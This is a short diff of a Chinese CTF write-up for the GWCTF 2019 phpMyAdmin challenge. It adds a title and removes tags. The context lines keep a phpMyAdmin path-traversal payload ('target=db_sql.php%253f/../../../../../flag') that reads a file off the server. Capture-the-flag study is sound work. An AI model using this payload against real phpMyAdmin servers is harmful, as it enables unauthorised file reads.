@@ -1,3 +1,4 @@
+# [GWCTF 2019]我有一个数据库
 ![](<./img/Pasted image 20221125210719.png>)
 
 ---
@@ -40,5 +41,3 @@ emmm没有思路，看看版本号蛮可疑的
 /phpmyadmin/index.php?target=db_sql.php%253f/../../../../../flag
 ```
 ![](<./img/Pasted image 20221125222248.png>)
-
-#Web #PHP #目录扫描 #phpmyadmin #Vulnerabilities #信息检索
